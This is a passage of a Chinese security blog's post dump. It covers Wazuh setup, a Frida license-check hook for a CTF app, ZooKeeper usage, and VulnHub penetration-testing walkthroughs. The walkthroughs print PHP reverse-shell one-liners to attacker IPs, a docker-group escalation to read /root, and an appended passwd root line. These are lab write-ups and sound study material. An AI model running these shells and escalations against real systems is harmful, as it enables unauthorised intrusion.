&lt;directories&gt;/etc,/usr/bin,/usr/sbin&lt;/directories&gt; #计划扫描的目录 &lt;directories&gt;/bin,/sbin&lt;/directories&gt; &lt;/syscheck&gt; &lt;syscheck&gt; #包含了实时扫描，同时带有who-data信息 &lt;directories check_all=&quot;yes&quot; whodata=&quot;yes&quot;&gt;/etc&lt;/directories&gt; &lt;/syscheck&gt; &lt;rule id=&quot;100345&quot; level=&quot;12&quot;&gt; #基于规则检测报警，规则id来自Management/Ruleset &lt;if_group&gt;syscheck&lt;/if_group&gt; &lt;match&gt;/var/www/htdocs&lt;/match&gt; &lt;description&gt;Changes to /var/www/htdocs - Critical file!&lt;/description&gt; &lt;/rule&gt; &lt;directories check_all=&quot;yes&quot;&gt;/etc,/usr/bin,/usr/sbin&lt;/directories&gt; #要检查的目录（执行所有可能的验证） &lt;ignore&gt;/etc/mtab&lt;/ignore&gt; #要忽略的目录 如果启用了whodata字段，需要执行以下安装 apt install auditd auditctl -l | grep wazuh_fim #检查是否应用了用于监视所选文件夹的审核规则：-w /etc -p wa -k wazuh_fim 命令监控，必须将代理显式配置为接受远程命令，文件/var/ossec/etc/local_internal_options.conf logcollector.remote_commands=1 根据文档建议，修改/var/ossec/etc/shared/agent.conf文件，如果包含多个组文件夹，需要到每个组文件夹下修改配置文件，name，os，profile是可以设置。 &lt;agent_config name=&quot;agent_name&quot;&gt; &lt;localfile&gt; &lt;location&gt;/var/log/my.log&lt;/location&gt; &lt;log_format&gt;syslog&lt;/log_format&gt; &lt;/localfile&gt; &lt;/agent_config&gt; &lt;agent_config os=&quot;Linux&quot;&gt; &lt;localfile&gt; &lt;location&gt;/var/log/linux.log&lt;/location&gt; &lt;log_format&gt;syslog&lt;/log_format&gt; &lt;/localfile&gt; &lt;/agent_config&gt; &lt;agent_config profile=&quot;database&quot;&gt; &lt;localfile&gt; &lt;location&gt;/var/log/database.log&lt;/location&gt; &lt;log_format&gt;syslog&lt;/log_format&gt; &lt;/localfile&gt; &lt;/agent_config&gt; &lt;agent_config name=&quot;kali&quot;&gt; &lt;localfile&gt; &lt;log_format&gt;command&lt;/log_format&gt; #command 指逐行读取 &lt;command&gt;df -P&lt;/command&gt; &lt;/localfile&gt; &lt;localfile&gt; &lt;log_format&gt;full_command&lt;/log_format&gt; #全部匹配查找 &lt;command&gt;netstat -tan |grep LISTEN |egrep -v &#39;(127.0.0.1| ::1)&#39; | sort&lt;/command&gt; &lt;/localfile&gt; &lt;/agent_config&gt; 漏洞检测，需要配置agent端和server端/var/ossec/etc/ossec.conf agent端 &lt;wodle name=&quot;syscollector&quot;&gt; &lt;disabled&gt;no&lt;/disabled&gt; &lt;interval&gt;1h&lt;/interval&gt; &lt;packages&gt;yes&lt;/packages&gt; &lt;/wodle&gt; server端 &lt;wodle name=&quot;vulnerability-detector&quot;&gt; &lt;disabled&gt;no&lt;/disabled&gt; &lt;interval&gt;5m&lt;/interval&gt; &lt;run_on_start&gt;yes&lt;/run_on_start&gt; &lt;feed name=&quot;ubuntu-18&quot;&gt; &lt;disabled&gt;no&lt;/disabled&gt; &lt;update_interval&gt;1h&lt;/update_interval&gt; &lt;/feed&gt; &lt;/wodle&gt; systemctl restart wazuh-manager #重启 虚拟机当然，如果觉得以上安装过于繁琐，可以选择虚拟机安装一个wazuh服务端，仅在64位系统中运行。不建议在生产中直接使用。 https://packages.wazuh.com/vm/wazuh3.10.2_7.3.2.ova root密码为wazh，api密码为默认的foo/bar。 安装的Elasticsearch /usr/share/elasticsearch。Filebeat安装在中/usr/share/filebeat，其配置文件位于中/etc/filebeat/filebeat.yml。 启动服务和重启相关服务 systemctl restart wazuh-manager systemctl restart wazuh-api systemctl stop elasticsearch systemctl start filebeat systemctl status kibana kibana地址为https://IP，在如下界面中即可看到wazuh做的相关配置检查，和建议。此建议开启tcp_syncookies来处理DOS攻击中的SYN握手的资源消耗。 根据配置文件查看对应配置是否开启，配置默认关闭，根据需求来判断是否开启。","categories":[],"tags":[{"name":"Open Source Security","slug":"Open-Source-Security","permalink":"/tags/Open-Source-Security/"}]},{"title":"Hook WhyShouldIPay","slug":"Hook-WhyShouldIPay","date":"2019-11-25T09:22:39.000Z","updated":"2019-11-25T09:24:43.449Z","comments":true,"path":"2019/11/Hook-WhyShouldIPay/","link":"","permalink":"/2019/11/Hook-WhyShouldIPay/","excerpt":"","text":"学习Frida的时候看到小肩膀视频中提到了一个apk，whyshouldipay。这个apk之前做过逆向分析修改，所以正好此处使用Frida来尝试HOOK。 逆向分析把apk丢到jeb中，从mainfast文件。可以看到首页activity是LauncherActivity。找到首页activity，点击反编译。 从代码中可以看到，其实是做了一次网络验证，但由于时间久远，这个apk貌似是16年的CTF使用，网址现在已经不能使用了。所以需要这里进行修改，利用AK来修改smail代码。重打包安装。 .method public verifyClick(Landroid/view/View;)V .locals 15 .line 39 .restart local v1 # &quot;b&quot;:[B .restart local v2 # &quot;con&quot;:Ljava/net/URLConnection; .restart local v5 # &quot;in&quot;:Ljava/io/InputStream; .restart local v9 # &quot;responseBuilder&quot;:Ljava/lang/StringBuilder; .restart local v11 # &quot;url&quot;:Ljava/net/URL; :cond_0 const-string v8, &quot;LICENSEKEYOK&quot; .line 40 #.local v8, &quot;response&quot;:Ljava/lang/String; const-string v12, &quot;LICENSEKEYOK&quot; invoke-virtual {v8, v12}, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z move-result v12 if-eqz v12, :cond_1 .line 43 new-instance v0, Ljava/lang/String; invoke-direct {p0}, Lde/fraunhofer/sit/premiumapp/LauncherActivity;-&gt;getMac()Ljava/lang/String; move-result-object v12 invoke-virtual {v12}, Ljava/lang/String;-&gt;getBytes()[B move-result-object v12 invoke-virtual {v8}, Ljava/lang/String;-&gt;getBytes()[B move-result-object v13 invoke-static {v12, v13}, Lde/fraunhofer/sit/premiumapp/MainActivity;-&gt;xor([B[B)[B move-result-object v12 invoke-direct {v0, v12}, Ljava/lang/String;-&gt;&lt;init&gt;([B)V .line 44 .local v0, &quot;activatedKey&quot;:Ljava/lang/String; invoke-virtual {p0}, Lde/fraunhofer/sit/premiumapp/LauncherActivity;-&gt;getApplicationContext()Landroid/content/Context; move-result-object v12 const-string v13, &quot;preferences&quot; const/4 v14, 0x0 invoke-virtual {v12, v13, v14}, Landroid/content/Context;-&gt;getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences; move-result-object v7 .line 45 .local v7, &quot;pref&quot;:Landroid/content/SharedPreferences; invoke-interface {v7}, Landroid/content/SharedPreferences;-&gt;edit()Landroid/content/SharedPreferences$Editor; move-result-object v4 .line 46 .local v4, &quot;editor&quot;:Landroid/content/SharedPreferences$Editor; const-string v12, &quot;KEY&quot; invoke-interface {v4, v12, v0}, Landroid/content/SharedPreferences$Editor;-&gt;putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor; .line 47 invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;-&gt;commit()Z .line 48 new-instance v12, Landroid/support/v7/app/AlertDialog$Builder; invoke-direct {v12, p0}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;&lt;init&gt;(Landroid/content/Context;)V const-string v13, &quot;Activation successful&quot; .line 49 invoke-virtual {v12, v13}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;setTitle(Ljava/lang/CharSequence;)Landroid/support/v7/app/AlertDialog$Builder; move-result-object v12 const-string v13, &quot;Activation successful&quot; .line 50 invoke-virtual {v12, v13}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;setMessage(Ljava/lang/CharSequence;)Landroid/support/v7/app/AlertDialog$Builder; move-result-object v12 const v13, 0x1080027 .line 51 invoke-virtual {v12, v13}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;setIcon(I)Landroid/support/v7/app/AlertDialog$Builder; move-result-object v12 .line 52 invoke-virtual {v12}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;show()Landroid/support/v7/app/AlertDialog; :cond_1 return-void .end method 修改如上，重新给v8寄存器赋值。并且删除以上全部请求代码，清楚其他try的代码，不然其做HTTP请求验证。完整的verifyClick函数smail代码如上。至此网络验证的给去掉了。 点击verify，就会显示验证成功，然后写入本地数据保存key值。 只不过这样修改，再点击premium的时候就是认证成功的了。 Hook 函数那么先hook一下getMac和getKey函数，看一下返回是什么值。 import frida, sys jscode = &quot;&quot;&quot; Java.perform(function(){ var lunc = Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;); lunc.getMac.implementation = function(){ send(&quot;HOOK Start....&quot;); var sed = this.getMac(); send(sed); var ser = this.getKey(); send(ser); return sed; } }) &quot;&quot;&quot; def message(message, data): if message[&quot;type&quot;] == &quot;send&quot;: print(&quot;[*] {0}&quot;.format(message[&#39;payload&#39;])) else: print(message) process = frida.get_remote_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;) script = process.create_script(jscode) script.on(&quot;message&quot;, message) script.load() sys.stdin.read() 在手机上打开Frida。转发端口27042。运行后获取到两个参数，一个是WiFi的Mac，一个是key。 然后按照修改返回参数来直接达到不修改apk的目的。 Hook 直接获得结果从代码中就可以看到，当返回结果为LICENSEKEYOK时，调用MainActivity类下的xor方法。参数一个是上面的Mac的byte值，一个是LICENSEKEYOK的byte值。 import frida, sys jscode = &quot;&quot;&quot; Java.perform(function(){ //字符串转byte function stringToBytes(str) { var ch, st, re = []; for (var i = 0; i &lt; str.length; i++ ) { ch = str.charCodeAt(i); // get char st = []; // set up &quot;stack&quot; do { st.push( ch &amp; 0xFF ); // push byte to stack ch = ch &gt;&gt; 8; // shift value down by 1 byte } while ( ch ); re = re.concat( st.reverse() ); } return re; } //byte转字符串 function byteToString(arr) { if(typeof arr === &#39;string&#39;) { return arr; } var str = &#39;&#39;, _arr = arr; for(var i = 0; i &lt; _arr.length; i++) { var one = _arr[i].toString(2), v = one.match(/^1+?(?=0)/); if(v &amp;&amp; one.length == 8) { var bytesLength = v[0].length; var store = _arr[i].toString(2).slice(7 - bytesLength); for(var st = 1; st &lt; bytesLength; st++) { store += _arr[st + i].toString(2).slice(2); } str += String.fromCharCode(parseInt(store, 2)); i += bytesLength - 1; } else { str += String.fromCharCode(_arr[i]); } } return str; } var lunc = Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;); var main = Java.use(&#39;de.fraunhofer.sit.premiumapp.MainActivity&#39;); lunc.getKey.implementation = function(){ send(&quot;HOOK Start....&quot;); var sed = this.getMac(); send(sed); //获取mac var xor = main.xor(stringToBytes(sed), stringToBytes(&quot;LICENSEKEYOK&quot;)); //生成key var ser = byteToString(xor); send(ser); return ser; } }) &quot;&quot;&quot; def message(message, data): if message[&quot;type&quot;] == &quot;send&quot;: print(&quot;[*] {0}&quot;.format(message[&#39;payload&#39;])) else: print(message) process = frida.get_remote_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;) script = process.create_script(jscode) script.on(&quot;message&quot;, message) script.load() sys.stdin.read() 执行如上代码，即可Hook到key函数，然后由xor生成，来返回给getKey函数。返回如下所示。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"Linux主机安全检查脚本","slug":"Linux主机安全检查脚本","date":"2019-11-22T07:36:57.000Z","updated":"2019-11-22T07:42:57.493Z","comments":true,"path":"2019/11/Linux主机安全检查脚本/","link":"","permalink":"/2019/11/Linux主机安全检查脚本/","excerpt":"","text":"检查项0.检测命令是否被修改 1.获取网络连接 2.查看对外开放端口 3.查看是否存在高危端口 4.查看启动项 5.查看定时任务 6.查看调度任务 7.检测cpu异常进程 8.检测特权用户 9.查看登陆用户 10.可登录用户 11.最近修改过的文件 12.查看是否存在可疑命令 13.root是否允许远程登陆 14.检查是否存在可疑脚本 15.日志文件打包 16.查看登陆到主机的用户 17.检查磁盘使用量 以上检查项按照比较关心的项来写，在Ubuntu主机上测试，个别命令可能centos不带，需要提前安装。 地址项目地址：https://github.com/MisakiKata/Linuxcheck 参考其中还包括一批后门端口，利用来自：port列表","categories":[],"tags":[{"name":"shell","slug":"shell","permalink":"/tags/shell/"}]},{"title":"vulnhub Chakravyuh","slug":"vulnhub-Chakravyuh","date":"2019-11-15T07:15:22.000Z","updated":"2019-11-25T09:30:06.073Z","comments":true,"path":"2019/11/vulnhub-Chakravyuh/","link":"","permalink":"/2019/11/vulnhub-Chakravyuh/","excerpt":"","text":"修改网络连接方式为DHCP 按照虚拟机网段查找分配的IP，此处分配的IP为192.168.120.138 信息发现按照惯例，首先把主机开放端口扫描，发现开放端口为80、22、65530。其中65530是一个ftp服务，连接发现无密码，文件夹pub下存在一个arjun.7z的压缩包。 访问80端口，就一张图片，扫描路径，发现phpmyadmin。无空密码。 爆破压缩包到此，需要一个能登陆phpmyadmin的账号密码。尝试爆破7z压缩包。利用一个小脚本爆破。 根据脚本的建议，需要一份字典，rockyou or crackstation。是kali上的字典，但是手头没有kali。直接搜索下载。 https://www.scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt 爆破是贼慢，但是密码成功出来了，是family。打开是一个secret.txt文件，里面有一个类似base64加密的字符串。 字符串为以下，看起来是账号：邮箱：密码。不过遗憾的是，并不能登陆phpmyadmin。那这个字符串就可能是字段：账号：密码的形式。 Z2lsYTphZG1pbkBnbWFpbC5jb206cHJpbmNlc2E= 解码为： gila:admin@gmail.com:princesa 利用已知漏洞后来试一下路径，发现存在这个一个地址，gila是一个cms。 http://192.168.120.138/gila/ 到官方网站，找到了官方给的demo站，后台地址是加admin。尝试是否也是admin。 http://192.168.120.138/gila/admin 登陆后，看到版本为1.10.9。基本可以确定是一个后台获取webshell的利用方式，搜索谷歌，查找一下是否有已知的漏洞。在exploit-db上找到了一个本地文件包含漏洞。尝试确实存在，而已可以上传文件。查看一下发现是content下的文件管理功能。 http://192.168.120.138/gila/admin/fm?f=./.. 利用上传文件创建新文件后门。在assert文件夹下，但是php文件不能访问，需要修改.htaccess文件。 修改为Allow from all，即可访问上传的文件。 反弹shell获取权限利用php反弹shell php -r &#39;$sock=fsockopen(&quot;192.168.30.79&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; #升级shell python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; 从id命令看到www-data是docker组的成员，而docker是可以免密码操作sudo的。详细参考 https://www.freebuf.com/articles/system/170783.html 借助一个docker镜像，查看本机存在一个alpine镜像 采用-v的目录映射，此处修改为/root:/root，运行进入docker内部 docker run -it --rm -v /root:/root alpine 找到root下的文件，打开即可","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"ZooKeeper","slug":"ZooKeeper","date":"2019-11-15T07:11:39.000Z","updated":"2019-11-15T08:08:28.999Z","comments":true,"path":"2019/11/ZooKeeper/","link":"","permalink":"/2019/11/ZooKeeper/","excerpt":"","text":"什么是Apache ZooKeeper？Apache ZooKeeper是由集群（节点组）使用的一种服务，用于在自身之间协调，并通过稳健的同步技术维护共享数据。ZooKeeper本身是一个分布式应用程序，为写入分布式应用程序提供服务。 ZooKeeper提供的常见服务如下 : 命名服务 - 按名称标识集群中的节点。它类似于DNS，但仅对于节点。 配置管理 - 加入节点的最近的和最新的系统配置信息。 集群管理 - 实时地在集群和节点状态中加入/离开节点。 选举算法 - 选举一个节点作为协调目的的leader。 锁定和同步服务 - 在修改数据的同时锁定数据。此机制可帮助你在连接其他分布式应用程序（如Apache HBase）时进行自动故障恢复。 高度可靠的数据注册表 - 即使在一个或几个节点关闭时也可以获得数据。 分布式应用程序提供了很多好处，但它们也抛出了一些复杂和难以解决的挑战。ZooKeeper框架提供了一个完整的机制来克服所有的挑战。竞争条件和死锁使用故障安全同步方法进行处理。另一个主要缺点是数据的不一致性，ZooKeeper使用原子性解析。 ZooKeeper的好处以下是使用ZooKeeper的好处： 简单的分布式协调过程 同步 - 服务器进程之间的相互排斥和协作。此过程有助于Apache HBase进行配置管理。 有序的消息 序列化 - 根据特定规则对数据进行编码。确保应用程序运行一致。这种方法可以在MapReduce中用来协调队列以执行运行的线程。 可靠性 原子性 - 数据转移完全成功或完全失败，但没有事务是部分的。 Java环境最新版zookeeper需要Java1.8.211以上。 比如利用源安装 yum install java-1.8.0-openjdk.x86_64 java -version openjdk version &quot;1.8.0_232&quot; ZooKeeper地址：https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.5.6/apache-zookeeper-3.5.6-bin.tar.gz 解压缩，进入conf目录修改zoo-sample.cfg文件为zoo.cfg文件。 打开文件，修改路径，类似如下 # The number of milliseconds of each tick tickTime=2000 # The number of ticks that the initial # synchronization phase can take initLimit=10 # The number of ticks that can pass between # sending a request and getting an acknowledgement syncLimit=5 # the directory where the snapshot is stored. # do not use /tmp for storage, /tmp here is just # example sakes. dataDir=/data/zookeeper # the port at which the clients will connect clientPort=2181 # the maximum number of client connections. # increase this if you need to handle more clients #maxClientCnxns=60 # # Be sure to read the maintenance section of the # administrator guide before turning on autopurge. # # http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance # # The number of snapshots to retain in dataDir #autopurge.snapRetainCount=3 # Purge task interval in hours # Set to &quot;0&quot; to disable auto purge feature #autopurge.purgeInterval=1 保存，到bin目录下执行 [root@VM_0_6_centos bin]# ./zkServer.sh start /usr/bin/java ZooKeeper JMX enabled by default Using config: /root/apache-zookeeper-3.5.6-bin/bin/../conf/zoo.cfg Starting zookeeper ... STARTED 开始服务后，启动cli端。 [root@VM_0_6_centos bin]# ./zkCli.sh /usr/bin/java Connecting to localhost:2181 创建Znode节点create /path /data eg: [zk: localhost:2181(CONNECTED) 4] create /datapp zookapp Created /datapp 创建顺序节点create -e /path /data eg: [zk: localhost:2181(CONNECTED) 5] create -s /datapp zookapp Created /datapp0000000003 删除节点[zk: localhost:2181(CONNECTED) 6] delete /datapp [zk: localhost:2181(CONNECTED) 7] ls /datapp Node does not exist: /datapp #删除带子节点的节点 [zk: localhost:2181(CONNECTED) 30] ls /datapp [sec] [zk: localhost:2181(CONNECTED) 33] deleteall /datapp [zk: localhost:2181(CONNECTED) 34] 获取数据[zk: localhost:2181(CONNECTED) 11] get /datapp zookapp [zk: localhost:2181(CONNECTED) 13] get -s /datapp #查看全部数据 zookapp cZxid = 0xc ctime = Thu Nov 07 11:10:41 CST 2019 mZxid = 0xc mtime = Thu Nov 07 11:10:41 CST 2019 pZxid = 0xc cversion = 0 dataVersion = 0 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 7 numChildren = 0 [zk: localhost:2181(CONNECTED) 18] set /datapp zookupdate #设置更改 WATCHER:: WatchedEvent state:SyncConnected type:NodeDataChanged path:/datapp [zk: localhost:2181(CONNECTED) 19] get -w /datapp #查看更改 zookupdate [zk: localhost:2181(CONNECTED) 20] set /datapp cversion=1 WATCHER:: WatchedEvent state:SyncConnected type:NodeDataChanged path:/datapp [zk: localhost:2181(CONNECTED) 21] get -w /datapp cversion=1 设置数据[zk: localhost:2181(CONNECTED) 18] set /datapp zookupdate WATCHER:: WatchedEvent state:SyncConnected type:NodeDataChanged path:/datapp [zk: localhost:2181(CONNECTED) 19] get -w /datapp zookupdate 创建子节点[zk: localhost:2181(CONNECTED) 28] create /datapp zookapp Created /datapp [zk: localhost:2181(CONNECTED) 29] create /datapp/sec zookapp2 Created /datapp/sec [zk: localhost:2181(CONNECTED) 30] ls /datapp [sec] [zk: localhost:2181(CONNECTED) 31] get /datapp zookapp [zk: localhost:2181(CONNECTED) 32] get /datapp/sec zookapp2 Zookeeper集群部署此处利用一台主机模拟两个zookeeper部署，在root目录下创建两个文件夹， 一个为zookeeper1，一个为zookeeper2。而实际环境中最小需要三个节点，最好是奇数节点。 创建data目录，在conf配置文件中修改如下，端口由于是在一台主机上，所以需要不同的端口，正常形式下，可以设置为不同IP同端口。 # The number of milliseconds of each tick tickTime=2000 # The number of ticks that the initial # synchronization phase can take initLimit=10 # The number of ticks that can pass between # sending a request and getting an acknowledgement syncLimit=5 # the directory where the snapshot is stored. # do not use /tmp for storage, /tmp here is just # example sakes. dataDir=/data/zookeeper1 # the port at which the clients will connect clientPort=2181 # the maximum number of client connections. # increase this if you need to handle more clients #maxClientCnxns=60 # # Be sure to read the maintenance section of the # administrator guide before turning on autopurge. # # http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance # # The number of snapshots to retain in dataDir #autopurge.snapRetainCount=3 # Purge task interval in hours # Set to &quot;0&quot; to disable auto purge feature #autopurge.purgeInterval=1 server.1=127.0.0.1:7788:8890 server.2=127.0.0.1:7789:8891 创建data/myid文件创建文件myid，写入配置文件中的server名。文件的存在位置跟配置文件中的dataDir一致。 [root@VM_0_6_centos zookeeper1]# echo &quot;1&quot; &gt; myid [root@VM_0_6_centos zookeeper1]# ls myid 分别启动后查看状态可以发现，已经选举了一个为leader [root@VM_0_6_centos zookeeper2]# ./bin/zkServer.sh status /usr/bin/java ZooKeeper JMX enabled by default Using config: /root/zookeeper2/bin/../conf/zoo.cfg Client port found: 2182. Client address: localhost. Mode: leader [root@VM_0_6_centos zookeeper1]# ./bin/zkServer.sh status /usr/bin/java ZooKeeper JMX enabled by default Using config: /root/zookeeper1/bin/../conf/zoo.cfg Client port found: 2181. Client address: localhost. Mode: follower 在leader端修改数据，新建znode节点 [zk: localhost:2181(CONNECTED) 0] create /datapp idsign Created /datapp [zk: localhost:2181(CONNECTED) 1] follow端 [zk: localhost:2181(CONNECTED) 0] get /datapp idsign [zk: localhost:2181(CONNECTED) 1] follow端修改数据，leader端同步到数据，向其他follow写入数据 [zk: localhost:2181(CONNECTED) 1] set /datapp idsign=xxxx [zk: localhost:2181(CONNECTED) 0] get /datapp idsign=xxxx [zk: localhost:2181(CONNECTED) 1] ZooKeeper API官方提供了绑定Java和C的API，此处不做使用解释。以下以python的API使用为例。 Java版文档：http://zookeeper.apache.org/doc/r3.3.3/api/org/apache/zookeeper/ZooKeeper.html Java示例：https://blog.csdn.net/u013468915/article/details/80878490 python版文档：https://kazoo.readthedocs.io/en/latest/install.html pip install kazoo #安装kazoo 连接到ZooKeeper from kazoo.client import KazooClient zk = KazooClient(hosts=&#39;106.54.181.187:2181&#39;) #连接 zk.start() 节点状态 from kazoo.client import KazooState def my_listener(state): if state == KazooState.LOST: print(&#39;ZooKeeper Lost&#39;) # 状态为丢失时 elif state == KazooState.SUSPENDED: print(&#39;ZooKeeper Suspended&#39;) # 状态为暂停 else: print(&#39;ZooKeeper Connect&#39;) # 状态为连接中 zk.add_listener(my_listener) Zookeeper 3.4及更高版本支持只读模式。 必须为Zookeeper集群中的服务器打开此模式，客户端才能使用它。 要将这种模式与Kazoo一起使用，应在read_only选项设置为True的情况下调用KazooClient。 这将使客户端连接到已变为只读的Zookeeper节点，并且客户端将继续扫描其他可读写的节点。 from kazoo.client import KazooClient from kazoo.client import KazooState from kazoo.client import KeeperState zk = KazooClient(hosts=&#39;127.0.0.1:2181&#39;, read_only=True) zk.start() @zk.add_listener def watch_for_ro(state): if state == KazooState.CONNECTED: if zk.client_state == KeeperState.CONNECTED_RO: print(&quot;Read only mode!&quot;) else: print(&quot;Read/Write mode!&quot;) 创建节点，使用的方法有ensure_path()和create() # 确定路径，在必要时创建 zk.ensure_path(&quot;/my/favorite&quot;) # 用数据创建一个节点 zk.create(&quot;/my/favorite/node&quot;, b&quot;a value&quot;) 读取节点信息 exists() 检查节点是否存在。 get() 在ZnodeStat结构中获取节点的数据以及详细的节点信息。 get_children() 获取给定节点的子级列表 eg: if zk.exists(&quot;/my/favorite&quot;): #判断/my/favorite是否存在 data, stat = zk.get(&quot;/my/favorite&quot;) #查看节点信息 print(&quot;Version: %s, data: %s&quot; % (stat.version, data.decode(&quot;utf-8&quot;))) children = zk.get_children(&quot;/my/favorite&quot;) #查看节点的子节点信息 print(&quot;There are %s children with names %s&quot; % (len(children), children)) 更新节点信息 zk.set(&quot;/my/favorite&quot;, b&quot;some data&quot;) 删除节点信息 zk.delete(&quot;/my/favorite/node&quot;, recursive=True) 重试命令 result = zk.retry(zk.get, &quot;/path/to/node&quot;) 相当于执行 zk.get(&#39;/path/to/node&#39;) 利用如上信息，编写操作ZooKeeper的Python脚本 #coding:utf-8 from kazoo.client import KazooClient class zoocon: def __init__(self): self.zk = KazooClient(hosts=&#39;106.54.181.187:2181&#39;) #连接 self.zk.start() self.path = &#39;/datapp&#39; def get_data(self): res = self.zk.get(self.path) print(res) def exist(self): self.zk.exists(self.path) return True def create_data(self): self.zk.create(self.path, b&#39;signapp&#39;) def close(self): self.zk.close() def delete(self): self.zk.delete(self.path, recursive=True) if __name__ == &#39;__main__&#39;: zks = zoocon() if zks.exist(): zks.delete() zks.close() print &#39;path delete&#39; else: zks.create_data() zks.get_data() zks.close() 服务端存在datapp节点，运行后删除节点，当在服务器查看时，显示如下 [zk: localhost:2181(CONNECTED) 0] get /datapp org.apache.zookeeper.KeeperException$NoNodeException: KeeperErrorCode = NoNode for /datapp","categories":[],"tags":[{"name":"Open Source Security","slug":"Open-Source-Security","permalink":"/tags/Open-Source-Security/"}]},{"title":"VulnHub AI WEB 1.0","slug":"AI-WEB 1.0","date":"2019-11-06T08:39:05.000Z","updated":"2019-11-25T09:29:51.997Z","comments":true,"path":"2019/11/AI-WEB 1.0/","link":"","permalink":"/2019/11/AI-WEB 1.0/","excerpt":"","text":"加载虚拟机后，由于没有账号暂不登录，通过虚拟机网段，查询DHCP分配的地址。 扫描端口发现只有80的对外开放端口，访问发现 扫描路径发现robots文件。其中两个路径文件，看样子是文件上传的地址。 访问其中地址，403 介于是403尝试访问上一级发现 尝试输入1，发现显示admin用户，那就是说可能这是个注入点。 检查是否存在注入，发现存在 查询systemUser库发现三个用户 t00r | FakeUserPassw0rd aiweb1pwn | MyEvilPass_f908sdaf9_sadfasf0sa u3er | N0tThis0neAls0 扫描路径m3diNf0下的文件，发现如下地址。 http://192.168.111.132/m3diNf0/info.php 找到物理地址，利用sqlmap写shell 把给的路径加上物理地址都试一圈，发现如下地址是可写的。 /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/ 利用sqlmap上传文件的小马来上传一句话，利用蚁剑连接 http://192.168.111.132/se3reTdir777/uploads/a.php 来到home目录下发现一个用户aiweb1。由于蚁剑的shell端是哑shell，反弹一个shell来提升。 php -r &#39;$sock=fsockopen(&quot;10.102.45.228&quot;,8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; 获取shell后查看发现是较高版本的内核，理论上不是内核提权。 查看passwd文件，发现存在账号aiweb1pwn。利用之前获得的账号登陆 但是这个账号下并没有发现有用的东西，利用suid位也没找到有用的信息。上传LinEnum.sh。来检查有用的信息。 后来在查看文件信息的时候发现passwd文件居然属于www-data用户权限。 这么说我这个账号还是多余的用来。 利用perl来生成加密的密码，账号密码admin perl -le &#39;print crypt(&quot;admin&quot;,&quot;123&quot;)&#39; //12wGaKkN1hGuw admin:12wGaKkN1hGuw:0:0:User_like_root:/root:/bin/bash 直接在蚁剑中追加一行 sudo过来就已经是root权限 找到flag","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"GitHub-Monitor","slug":"GitHub-Monitor","date":"2019-11-06T04:41:49.000Z","updated":"2019-11-06T04:41:49.864Z","comments":true,"path":"2019/11/GitHub-Monitor/","link":"","permalink":"/2019/11/GitHub-Monitor/","excerpt":"","text":"GITHUB_MONTIOR python3 + Django 2.2.6 + supervisord 环境由简单的Django完成，外加一个HTML展示模板 GitHub的爬虫由supervisord来维护，需要修改配置文件内的信息，可以改成/var/run路径 pip安装如下的文件即可 爬虫需要账号密码模拟登陆，进程为五分钟一次。是否扫描根据任务数据里保存的时间来做判断。 修改任务只需要在编辑里输入任务名，直接输入其他参数更新即可。 数据库采用MySQL5.7。 python3 manager.py createsuperuser python3 manager.py makemigrations python3 manager.py migrate 登陆后台添加一个可以登陆前端的账号即可。 地址：https://github.com/MisakiKata/github_monitor 首界面 全部信息 未处理信息 界面由于对js了解较少，没有采用比较nodejs类前端框架，当然也可以修改为自己喜欢的界面。 食用简单，望喜欢。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"2018SUSCTF-Mobile题","slug":"2018SUSCTF-Mobile题","date":"2019-10-23T08:29:20.000Z","updated":"2019-10-23T08:29:20.575Z","comments":true,"path":"2019/10/2018SUSCTF-Mobile题/","link":"","permalink":"/2019/10/2018SUSCTF-Mobile题/","excerpt":"","text":"BabyAndroid常规，JEB反编译 根据输入的字符串长度，第一位和97异或，后面跟v0的字符异或，把结果字符串转入a函数中。a函数首先把给出的常量字符串转为数组，把传入的字符串转化为bytes数组，再根据数组长度把每一位做for中&amp;和左移计算，结果为3267347723651E492C1D7E117C1946325D02432D493B0B62067B则为真。所以逆推，由于一次计算拼接两位，所以按照两位为一个字符计算。其中含有字母，调试得知是对应的十六进制数。 #coding:utf-8 strs = &quot;3267347723651E492C1D7E117C1946325D02432D493B0B62067B&quot; num = [] for i in range(0, len(strs)): num.append(strs[i]) #52 nums = [] id = 0 while id &lt; 52: for i in range(0,200): if str((i &amp; 0xF0) &gt;&gt; 4) == num[id]: if hex(i &amp; 15).replace(&#39;0x&#39;,&#39;&#39;).upper() == num[id+1]: nums.append(i) break id = id + 2 flag = [] for i in range(0, len(nums)): if i == 0: first = nums[i] ^ 97 flag.append(first) else: sc = nums[i] ^ nums[i-1] flag.append(sc) text = &#39;&#39; for i in flag: text = text + chr(i) print(text) &gt;&gt;&gt; SUSCTF{We1come_to_Andr0id} 后来看了其他资料，才发现a函数下面的for循环就是找16进制对应的十进制数，如 &gt;&gt;&gt; 